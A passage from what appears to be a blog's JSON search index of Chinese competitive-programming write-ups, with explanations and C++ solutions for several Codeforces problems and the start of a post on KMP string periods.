= 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}/* 把S1~T1, S2~T2的最短路网络求出来, 然后求出两个网络的公共边并建图, 得到一个DAG, 在上面跑最长路.*/class lfs { public: lfs(int N) { memset(head, -1, sizeof head); ecnt = 0; n = N; } void adde(int from, int to, int w) { Edge now; now.to = to; now.w = w; now.next = head[from]; now.mark1 = now.mark2 = false; e.push_back(now); head[from] = ecnt++; } void addde(int a, int b, int w) { adde(a, b, w); adde(b, a, w); } protected: struct Edge { int to, next, w; bool mark1, mark2; }; vector&lt;Edge&gt; e; int head[MAXN]; int ecnt; int n;};class long_path : public lfs { public: long_path(int n) : lfs(n) {} int solve() { memset(dp, -1, sizeof dp); int ans = 0; for (int i = 1; i &lt;= n; i++) { if (dp[i] == -1) { dfs(i, -1); } } for (int i = 1; i &lt;= n; i++) { ans = max(ans, dp[i]); } return ans; } protected: int dp[MAXN]; void dfs(int u, int fa) { dp[u] = 0; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v == fa) continue; if (dp[v] == -1) { dfs(v, u); } dp[u] = max(dp[u], dp[v] + e[i].w); } }};class spfa : public lfs { public: spfa(int n) : lfs(n) { memset(dis, INF, sizeof dis); } int dis[MAXN]; void solve(int s) { memset(ins, false, sizeof ins); memset(dis, INF, sizeof dis); queue&lt;int&gt; q; q.push(s); ins[s] = true; dis[s] = 0; while (!q.empty()) { int now = q.front(); q.pop(); ins[now] = false; for (int i = head[now]; i != -1; i = e[i].next) { int w = e[i].w; int v = e[i].to; if (dis[now] + w &lt; dis[v]) { dis[v] = dis[now] + w; if (!ins[v]) { q.push(v); ins[v] = true; } } } } } void mark1(int s, int t) { solve(s); int* dis1 = new int[MAXN]; memcpy(dis1, dis, sizeof dis); solve(t); for (int u = 1; u &lt;= n; u++) { for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dis1[u] + e[i].w + dis[v] == dis1[t]) { // clog &lt;&lt; \"Mark1 \" &lt;&lt; u &lt;&lt; ' ' &lt;&lt; v &lt;&lt; endl; e[i].mark1 = true; } } } delete[] dis1; } void mark2(int s, int t) { solve(s); int* dis1 = new int[MAXN]; memcpy(dis1, dis, sizeof dis); solve(t); for (int u = 1; u &lt;= n; u++) { for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dis1[u] + e[i].w + dis[v] == dis1[t]) { // clog &lt;&lt; \"Mark2 \" &lt;&lt; u &lt;&lt; ' ' &lt;&lt; v &lt;&lt; endl; e[i].mark2 = true; } } } delete[] dis1; } void create_dag(lfs* dag1, lfs* dag2) { for (int u = 1; u &lt;= n; u++) { for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (e[i].mark1 &amp;&amp; e[i].mark2) { dag1-&gt;adde(u, v, e[i].w); } if (e[i].mark1 &amp;&amp; e[i^1].mark2) { dag2-&gt;adde(u, v, e[i].w); } } } } private: bool ins[MAXN];};int main() { int n = read(); int m = read(); int s1 = read(); int t1 = read(); int s2 = read(); int t2 = read(); spfa* all = new spfa(n); for (int i = 1; i &lt;= m; i++) { int u = read(); int v = read(); int w = read(); all-&gt;addde(u, v, w); } all-&gt;mark1(s1, t1); all-&gt;mark2(s2, t2); long_path* dag1 = new long_path(n); long_path* dag2 = new long_path(n); all-&gt;create_dag(dag1, dag2); cout &lt;&lt; max(dag1-&gt;solve(), dag2-&gt;solve()) &lt;&lt; endl; return 0;}","tags":["题解","oi","图论"],"categories":["OI"]},{"title":"Codeforces Round 580 (Div. 2)","path":"/2019/8/19/Codeforces-1206/","content":"https://codeforces.com/contest/1206https://codeforces.com/contest/1206 这次cf的div. 2感觉是手速场啊, ABC题能读懂题就会做; D题虽然看上去有好多pretest但是依然很水, 一大半的人都fst了; EF题div. 2就没几个人做得出来…(居然还有交互题, 长见识了) A. Choose Two Numbers 签到题, 直接枚举. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 210;int a[MAXN], b[MAXN];bool ins[MAXN];#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main() { int n = read(); for (int i = 1; i &lt;= n; i++) { cin &gt;&gt; a[i]; ins[a[i]] = true; } int m = read(); for (int i = 1; i &lt;= m; i++) { cin &gt;&gt; b[i]; ins[b[i]] = true; } for (int i = 1; i &lt;= n; i++) { for (int j = 1; j &lt;= m; j++) { if (a[i] + b[j] &gt; 200 || !ins[a[i] + b[j]]) { cout &lt;&lt; a[i] &lt;&lt; ' ' &lt;&lt; b[j] &lt;&lt; endl; return 0; } } } return 0;} B. Make Product Equal One 简单分类讨论, 记得int64(结果我就数组开小了WA了一次). 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 1e5 + 10;#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int a[MAXN];int main() { int n = read(); int64 ans = 0; int cnt0 = 0, cntn1 = 0; for (int i = 1; i &lt;= n; i++) { a[i] = read(); if (a[i] &gt; 0) { ans += a[i] - 1; } else if (a[i] == 0) { ans += 1; cnt0++; } else { ans += -a[i] - 1; cntn1++; } } if (cntn1 &amp; 1) { if (cnt0 == 0) { ans += 2; } } cout &lt;&lt; ans &lt;&lt; endl; return 0;} C. Almost Equal 找规律, 盲猜奇数可以偶数不行, 手推几个发现确实是这样. 规律的结论直接看代码吧. 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 1e5;int ans[MAXN];int main() { int n; cin &gt;&gt; n; if (n &amp; 1) { cout &lt;&lt; \"YES\" &lt;&lt; endl; for (int i = 1; i &lt;= n; i++) { if (i &amp; 1) { ans[i] = i; } else { ans[i] = 2 * n + 2 - i; } cout &lt;&lt; ans[i] &lt;&lt; ' '; } for (int i = 1; i &lt;= n; i++) { cout &lt;&lt; (((ans[i] + 1) ^ 1) - 1) &lt;&lt; ' '; } cout &lt;&lt; endl; } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; } return 0;} D. Shortest Cycle 如果有大于等于3个数在某一位上是1, 答案就是3 建图DFS找环, 每个开一个点, 1到64各开一个点, 如果某一个数有某一个二进制位就向相应的二进制位节点连一条无向边, DFS时忽略长度小于等于4的环, 答案是DFS找出的最小环长度除以2. 结果我做题的时候没有判第一点还过pretest了, 最后五分钟发现, 病急乱投医, resubmission还是写挂了, 最终fst… 下面是正确代码. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 1e5 + 1000;const int MAXS = 64;int cnt[MAXS + 10];class lfs { public: lfs(int N) { memset(head, -1, sizeof head); ecnt = 0; n = N; } void adde(int from, int to) { e[ecnt].to = to; e[ecnt].next = head[from]; head[from] = ecnt++; } void addde(int a, int b) { // clog &lt;&lt; \"adding edge\" &lt;&lt; a &lt;&lt; b &lt;&lt; endl; adde(a, b); adde(b, a); } int solve() { memset(dep, 0, sizeof dep); memset(vis,false,sizeof vis); ans = INF; for (int i = 1; i &lt;= 64; i++) { if (cnt[i] &gt;= 3) { return 3; } } for (int i = 1; i &lt;= n; i++) { if (!vis[i]) dfs(i, 0, 1); } return (ans &lt; INF) ? (ans / 2) : -1; } protected: struct Edge { int to, next; } e[MAXN * 64 * 2]; int head[MAXN]; int ecnt; int n; int ans; int dep[MAXN]; bool vis[MAXN]; void dfs(int u, int fa, int d) { dep[u] = d; vis[u] = true; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v != fa) { if (vis[v]) { int len = abs(dep[u] - dep[v]) + 1; if (len &gt; 4) { ans = min(ans, len + 1); } } else { dfs(v, u, d + 1); } } } }};int64 a[MAXN];#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main() { int n = read(); auto graph = new lfs(n + 64); for (int i = 1; i &lt;= n; i++) { a[i] = read&lt;int64&gt;(); for (int64 j = 1; j &lt;= 64; j++) { if ((a[i] &gt;&gt; (j - 1)) &amp; 1) { graph-&gt;addde(i, n + j); cnt[j]++; } } } cout &lt;&lt; graph-&gt;solve() &lt;&lt; endl; return 0;} EF过于毒瘤, 全场都没有几个人做掉…","tags":["题解","oi"],"categories":["OI"]},{"title":"Codeforces Round 578 (Div. 2)","path":"/2019/8/16/Codeforces-1200/","content":"https://codeforces.com/contest/1200https://codeforces.com/contest/1200 好久没有打过cf了… 一直没有时间合适的比赛, rating狂掉. 这次正常Div. 2难度吧, 刚好做出4道题, 我真是太弱了. A. Hotelier 签到题, 读完题就完事了. (我被网卡了将近十分钟) 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 1e5 + 10;bool ans[10];int main() { int n; string s; cin &gt;&gt; n &gt;&gt; s; for (auto i : s) { if (i == 'L') { for (int j = 0; j &lt; 10; j++) { if (!ans[j]) { ans[j] = true; break; } } } else if (i == 'R') { for (int j = 9; j &gt;= 0; j--) { if (!ans[j]) { ans[j] = true; break; } } } else { ans[i - '0'] = false; } } for (int i = 0; i &lt; 10; i++) { cout &lt;&lt; (ans[i] ? '1' : '0'); } cout &lt;&lt; endl; return 0;} B. Block Adventure 贪心, 背包容量无限, 能拿多少就拿多少, 注意特判柱子拿空了的情况. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 110;int h[110];#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main() { int tcnt = read(); for (int T = 1; T &lt;= tcnt; T++) { int n = read(); int m = read(); int k = read(); for (int i = 1; i &lt;= n; i++) { h[i] = read(); } int bag = m; bool ok = true; for (int i = 2; i &lt;= n; i++) { bag += min(h[i - 1], h[i - 1] - (h[i] - k)); if (bag &lt; 0) { ok = false; break; } } cout &lt;&lt; (ok ? \"YES\" : \"NO\") &lt;&lt; endl; } return 0;} C. Round Corridor GCD即可, 注意int64. 1234567891011121314151617181920212223242526272829303132#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;numeric&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;// const int MAXN = ;int main() { int64 n, m; cin &gt;&gt; n &gt;&gt; m; int64 GCD = gcd(n, m); int64 ng = n / GCD; int64 mg = m / GCD; int q; cin &gt;&gt; q; for (int i = 1; i &lt;= q; i++) { int64 sx, sy, ex, ey; cin &gt;&gt; sx &gt;&gt; sy &gt;&gt; ex &gt;&gt; ey; int64 sid = (sy - 1) / ((sx == 1) ? ng : mg); int64 eid = (ey - 1) / ((ex == 1) ? ng : mg); cout &lt;&lt; ((sid == eid) ? \"YES\" : \"NO\") &lt;&lt; endl; } return 0;} D. White Lines 预处理行和列方向上每个长为的区间能否消掉当前行列, 再前缀和判断相对方向的总价值(比赛时写成单调区间了, 不过反正都, 没有被卡掉), 最后记得加上原来就是白色的行列 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;deque&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 2010;char map[MAXN][MAXN];int sum_col[MAXN][MAXN]; // 列前缀和int sum_row[MAXN][MAXN]; // 行前缀和// bool can_erase_col[MAXN][MAXN];// bool can_erase_row[MAXN][MAXN];int sum2_col[MAXN][MAXN];int sum2_row[MAXN][MAXN];int n, k;inline bool can_erase_row(int i, int j) { return (sum_row[i][n] != 0) &amp;&amp; (sum_row[i][j - 1] == 0) &amp;&amp; (sum_row[i][n] == sum_row[i][j + k - 1]);}inline bool can_erase_col(int i, int j) { return (sum_col[n][j] != 0) &amp;&amp; (sum_col[i - 1][j] == 0) &amp;&amp; (sum_col[n][j] == sum_col[i + k - 1][j]);}int main() { cin &gt;&gt; n &gt;&gt; k; for (int i = 1; i &lt;= n; i++) { scanf(\"%s\", map[i] + 1); } for (int i = 1; i &lt;= n; i++) { sum_row[i][0] = 0; for (int j = 1; j &lt;= n; j++) { sum_row[i][j] = sum_row[i][j - 1] + ((map[i][j] == 'B') ? 1 : 0); } } for (int j = 1; j &lt;= n; j++) { sum_col[0][j] = 0; for (int i = 1; i &lt;= n; i++) { sum_col[i][j] = sum_col[i - 1][j] + ((map[i][j] == 'B') ? 1 : 0); } } for (int i = 1; i + k - 1 &lt;= n; i++) { deque&lt;int&gt; q; for (int j = 1; j &lt; k; j++) { if (can_erase_col(i, j)) q.push_back(j); } for (int j = k; j &lt;= n; j++) { int seg_head = j - k + 1; while (!q.empty() &amp;&amp; q.front() &lt; seg_head) q.pop_front(); if (can_erase_col(i, j)) q.push_back(j); sum2_row[i][seg_head] = q.size(); } } for (int j = 1; j + k - 1 &lt;= n; j++) { deque&lt;int&gt; q; for (int i = 1; i &lt; k; i++) { if (can_erase_row(i, j)) q.push_back(i); } for (int i = k; i &lt;= n; i++) { int seg_head = i - k + 1; while (!q.empty() &amp;&amp; q.front() &lt; seg_head) q.pop_front(); if (can_erase_row(i, j)) q.push_back(i); sum2_col[seg_head][j] = q.size(); } } // clog &lt;&lt; endl; // for (int i = 1; i &lt;= n; i++) { // for (int j = 1; j &lt;= n; j++) { // clog &lt;&lt; sum2_row[i][j] &lt;&lt; ' '; // } // clog &lt;&lt; endl; // } // clog &lt;&lt; endl; // for (int i = 1; i &lt;= n; i++) { // for (int j = 1; j &lt;= n; j++) { // clog &lt;&lt; sum_col[i][j] &lt;&lt; ' '; // } // clog &lt;&lt; endl; // } int ans = 0; for (int i = 1; i + k - 1 &lt;= n; i++) { for (int j = 1; j + k - 1 &lt;= n; j++) { ans = max(ans, sum2_col[i][j] + sum2_row[i][j]); } } for (int i = 1; i &lt;= n; i++) { if (sum_row[i][n] == 0) ans++; if (sum_col[n][i] == 0) ans++; } cout &lt;&lt; ans &lt;&lt; endl; return 0;} 限于我的能力, 后面的题都没有做了, E题看了一下似乎是后缀自动机, F题看都没看了…","tags":["题解","oi"],"categories":["OI"]},{"title":"CF870F Paths","path":"/2019/7/24/Codeforces-870F/","content":"https://www.luogu.org/problemnew/show/CF870Fhttps://www.luogu.org/problemnew/show/CF870F 题意 照搬洛谷翻译 给定一张个顶点的图, 对于点, 如果,则到有一条长度为1的无向边. 令表示从i到j的最短路, 如果无法到，则. 求节点两两之间距离之和. 分析 先考虑两个数之间的路径情况. : 直接连边 : 设是的最小质因子 : 可以走, 路径长度为 : 不妨设, 那么有, 又有, 故一定是质数, 可以考虑存在一条这样的路径: , 路径长度为, 并且当时, 不存在这样的路径. 若以作为跳板来转移已经无解了, 用比更大的数来转移也不会有解, 因此路径只有以上三种情况. 然后考虑如何统计答案, 应该考虑分种类统计条数. : 利用欧拉函数来线性统计. : 不好直接做, 用总情况数来减. : 还是令, 若这样的路径存在, 需满足以下条件: 根据上面的推理, 是质数, 所以只需统计最小质因子是的数的个数(线性筛可以做到), 对于的就是长度为的路径, 否则就是不连通. 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 1e7 + 10;bool isnt_prime[MAXN];int64 prime[MAXN], phi[MAXN];int64 mfac_cnt[MAXN], mfac_sum[MAXN];#define sum(l, r) (((r) &lt; (l)) ? 0 : (mfac_sum[(r)] - mfac_sum[(l) - 1]))int main() { int64 n; cin &gt;&gt; n; isnt_prime[1] = true; phi[1] = 1; int prime_cnt = 0; for (int i = 2; i &lt;= n; i++) { if (!isnt_prime[i]) { prime[prime_cnt++] = i; mfac_cnt[i]++; phi[i] = i - 1; } for (int j = 0; j &lt; prime_cnt; j++) { if (i * prime[j] &gt; n) break; isnt_prime[i * prime[j]] = true; mfac_cnt[prime[j]]++; if (i % prime[j] == 0) { phi[i * prime[j]] = phi[i] * prime[j]; break; } else { phi[i * prime[j]] = phi[i] * (prime[j] - 1); } } } for (int i = 1; i &lt;= n; i++) { mfac_sum[i] = mfac_sum[i - 1] + mfac_cnt[i]; } int64 path2 = 0; for (int i = 1; i &lt;= n; i++) { path2 += phi[i] - 1; // clog &lt;&lt; phi[i] &lt;&lt; endl; } int64 path1 = (n - 1) * (n - 2) / 2 - path2; // 先假设都是长度为2的路径, 待会统计的时候再调整 int64 ans = path2 * 2 + path1; for (int i = 0; i &lt; prime_cnt; i++) { // 长度为3的路径, fa &lt; n / 2 ans += mfac_cnt[prime[i]] * sum(max(prime[i] + 1, n / prime[i] + 1), max(prime[i], n / 2)); // 不存在的路径, fa &gt; n / 2 ans -= 2 * mfac_cnt[prime[i]] * sum(max(prime[i], n / 2) + 1, n); } cout &lt;&lt; ans &lt;&lt; endl; return 0;}","tags":["题解","oi","数论"],"categories":["OI"]},{"title":"CF852A Digits","path":"/2019/7/23/Codeforces-852A/","content":"https://www.luogu.org/problemnew/show/CF852Ahttps://www.luogu.org/problemnew/show/CF852A 好久都没写过题解了… 题意 给定一个大整数, 你需要对执行次操作, 一次操作为在这个数中间添加若干加号, 让这个数变成若干个数的和, 举个例子可以变成 , 要求执行这次操作之后为位数, 输出操作方案. 分析 最多有位, 令表示的各数位之和. 显然当时, 直接三次加满加号就行 当时, 加三次加号不行了, 第一步加成, 第二步, 第三步 当时, 也是三次加满加号 对于的情况: 令 以两位为间隔划分, 假设是奇数(有偶数位, 奇数位的情况同理), 令 错开一位, 令 两式相加并整理得 令, 考虑以下划分情况: 第一项是, 是三位数, 最后一项是, 一定是四位数, 易知以上两项之间不会相差, 那么以上划分情况中一定存在一种满足,这样的可以在剩下的两次操作中变成一位数 再推广到的情况 令 (假设凑的出来以上序列, 凑不出来的类推), 有 令最大(放缩一下,够用了) 再考虑刚才那样的依次合并连续两项的过程, 最开始是, 每次增加不超过, 最后大于, 位数多了一位, 一定存在一种情况满足, 可以两步解决. 代码 据说随机化第一步乱分很容易过(代码也短), 不过我没有写. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 200010;char A[MAXN];char buffer[MAXN];int n;void final_step(int fA) { if (fA != 199) { sprintf(buffer, \"%d\", fA); putchar(buffer[0]); int tot = buffer[0] - '0', bufs = strlen(buffer); for (int i = 1; i &lt; bufs; i++) { putchar('+'); putchar(buffer[i]); tot += buffer[i] - '0'; } putchar(' '); sprintf(buffer, \"%d\", tot); putchar(buffer[0]); bufs = strlen(buffer); for (int i = 1; i &lt; bufs; i++) { putchar('+'); putchar(buffer[i]); } putchar(' '); } else { puts(\"1+99\"); puts(\"1+0+0\"); }}void solve_by_split_2(int fA, int offset = 0, int find_line = 1000, bool need_plus = false) { int dfA = 0; for (int i = offset; i &lt; n; i += 2) { dfA += A[i] - '0'; } // 第一位要错开 if (dfA * 9 + fA &lt; find_line) { if (need_plus) putchar('+'); need_plus = true; putchar(A[offset++]); } int i; for (i = offset; i + 1 &lt; n; i += 2) { if (need_plus) putchar('+'); need_plus = true; putchar(A[i]); putchar(A[i + 1]); fA += (A[i] - '0') * 9; // 刚好凑出1000...00xx if (fA &gt; find_line) break; } for (i += 2; i &lt; n; i++) { putchar('+'); putchar(A[i]); } putchar(' '); final_step(fA);}bool try_solve_3(int offset, int fA, int find_line) { int dfA = 0; for (int i = offset; i + 2 &lt; n; i += 3) { dfA += (A[i] - '0') * 99 + (A[i + 1] - '0') * 9; } if (dfA + fA &gt;= find_line) { bool need_add = false; if (offset == 1) { putchar(A[0]); need_add = true; } else if (offset == 2) { putchar(A[0]); putchar(A[1]); need_add = true; } for (int i = offset; i + 2 &lt; n; i += 3) { if (fA + 999 &gt; find_line) { solve_by_split_2(fA, i, find_line, need_add); return true; } fA += (A[i] - '0') * 99 + (A[i + 1] - '0') * 9; if (need_add) putchar('+'); need_add = true; putchar(A[i]); putchar(A[i + 1]); putchar(A[i + 2]); } } return false;}int main() { cin &gt;&gt; n; cin &gt;&gt; A; int fA = 0; for (int i = 0; i &lt; n; i++) { fA += A[i] - '0'; } if (fA &lt;= 288) { putchar(A[0]); for (int i = 1; i &lt; n; i++) { putchar('+'); putchar(A[i]); } putchar(' '); final_step(fA); } else if (fA &lt; 1000) { solve_by_split_2(fA); } else { int line = 1; while (line &lt; fA) line *= 10; if (!try_solve_3(0, fA, line)) { if (!try_solve_3(1, fA, line)) { try_solve_3(2, fA + (A[0] - '0') * 9, line); } } } return 0;}","tags":["题解","oi","思维题","分类讨论"],"categories":["OI"]},{"title":"CF625E Frog Fights","path":"/2019/7/23/Codeforces-625E/","content":"https://www.luogu.org/problemnew/show/CF625Ehttps://www.luogu.org/problemnew/show/CF625E 题意 有只青蛙在一个长度为的环上打架；每只青蛙有一个初始位置，和一个跳跃数值。从号青蛙开始按序号循环行动，每次若第只青蛙行动，则它会向前跳个格子，撞飞它遇见的所有青蛙，包括终点格子上的，之后它的减少等同于撞飞的青蛙只数，若，它不会移动。求最后剩下的所有青蛙的编号。 ，不会有两只青蛙一开始在同一个格子里。 分析 先把青蛙按照位置排序. 我们在模拟过程中只关心两只青蛙(准确来说,相邻的两只)相撞的事件, 所以开一个priority_queue或set存下一次碰撞发生的时间, 用一个链表来维护每只青蛙的下一只是谁. 这样就可以依次按照时间先后顺序处理青蛙被撞飞的事件, 由于每只青蛙最多只被撞飞一次, 故时间复杂度为. 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;set&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 100010;// 第一关键字: 碰撞时间, 第二关键字: 碰撞的青蛙struct frog { int a, p, id; frog* succ; frog* prev; // 下标是frogs数组的下标} frogs[MAXN];struct comp { bool operator()(const pair&lt;int, frog*&gt;&amp; a, const pair&lt;int, frog*&gt;&amp; b) const { return (a.first == b.first) ? (a.second-&gt;id &lt; b.second-&gt;id) : (a.first &lt; b.first); }};set&lt;pair&lt;int, frog*&gt;, comp&gt; s;#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int m;// a撞上b需要的时间int time_to_hit(const frog&amp; a, const frog&amp; b) { if (a.id == b.id) return INF; int d = (b.p - a.p + m) % m; if (a.id &gt; b.id) { // b比a先行动; d = (d + b.a) % m; } if (d &lt;= a.a) return 1; // 即使a的速度不够也能跳到 if (a.a &lt;= b.a) return INF; // return ceil((double)(d - b.a) / (a.a - b.a)); return (d - b.a - 1) / (a.a - b.a) + 1;}int main() { int n = read(); m = read(); for (int i = 1; i &lt;= n; i++) { frogs[i].p = read(); frogs[i].a = read(); frogs[i].id = i; } sort(frogs + 1, frogs + n + 1, [](const frog&amp; a, const frog&amp; b) -&gt; bool { return a.p &lt; b.p; }); for (int i = 1; i &lt;= n; i++) { frogs[i].succ = &amp;frogs[(i + 1 &gt; n) ? 1 : (i + 1)]; frogs[i].prev = &amp;frogs[(i - 1 &lt; 1) ? n : (i - 1)]; } for (int i = 1; i &lt;= n; i++) { s.insert(make_pair(time_to_hit(frogs[i], *frogs[i].succ), &amp;frogs[i])); // clog &lt;&lt; time_to_hit(frogs[i], *frogs[i].succ) &lt;&lt; endl; } while (!s.empty()) { auto cur = *s.begin(); if (cur.first == INF) break; frog* now = cur.second; s.erase(cur); s.erase(make_pair(time_to_hit(*now-&gt;prev, *now), now-&gt;prev)); s.erase( make_pair(time_to_hit(*now-&gt;succ, *now-&gt;succ-&gt;succ), now-&gt;succ)); now-&gt;p += time_to_hit(*now, *now-&gt;succ); now-&gt;a--; now-&gt;succ = now-&gt;succ-&gt;succ; now-&gt;succ-&gt;prev = now; s.insert(make_pair(time_to_hit(*now-&gt;prev, *now), now-&gt;prev)); s.insert(make_pair(time_to_hit(*now, *now-&gt;succ), now)); } cout &lt;&lt; s.size() &lt;&lt; endl; for (auto i : s) { cout &lt;&lt; i.second-&gt;id &lt;&lt; ' '; } cout &lt;&lt; endl; return 0;}","tags":["题解","oi","思维题"],"categories":["OI"]},{"title":"CF852C Property","path":"/2019/7/23/Codeforces-852C/","content":"https://www.luogu.org/problemnew/show/CF852Chttps://www.luogu.org/problemnew/show/CF852C 题意 有一个正边形，在每条边上有等分点. 现在已经选定了个点, 个点分别位于第条边上, 且这个点的序号构成了一个排列; 你需要再选出个点位于第条边上, 并且这个点的序号也构成一个排列, 使得这些点构成的多边形面积最大. 输出选择方案. 图片2.png 的一种选法, 蓝色是给定点, 红色是自选点. 图片1.png 以上情况的最优解. 分析 要让保留的面积最大, 就要让删去的面积最小. 考虑计算每一个选择点对删去面积的贡献. 图片3.png 和是给定点, 是动点. 是删去区域的面积. 目的是要最小化, 由于是到的一个排列, 所以应该用小的搭配大的, 就能使总和尽量小. 代码 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 50000 + 10;int a[MAXN], b[MAXN], ans[MAXN];int main() { int n; cin &gt;&gt; n; for (int i = 1; i &lt;= n; i++) { cin &gt;&gt; a[i]; b[i] = i; } a[n + 1] = a[1]; sort(b + 1, b + n + 1, [](const int&amp; A, const int&amp; B) -&gt; bool { return a[A] + a[A + 1] &lt; a[B] + a[B + 1]; }); for (int i = 1; i &lt;= n; i++) { ans[b[i]] = i - 1; } for (int i = 1; i &lt;= n; i++) { cout &lt;&lt; ans[i] &lt;&lt; ' '; } cout &lt;&lt; endl; return 0;}","tags":["题解","oi","思维题"],"categories":["OI"]},{"title":"KMP算法求串的循环节长度","path":"/2019/7/15/KMP-Loop/","content":"next数组 next数组的作用: 在失配时, 应该将模板串的指针指向哪个位置 next数组的意义: 前面长度为i的字串中, 前后缀相等的最大长度 求法一 12345678910111213141516memset(next, 0, sizeof next);int j = 0, k = -1; // j前缀，k后缀next[0] = -1;while (j &lt; m - 1) { if (k == -1 || T[j] == 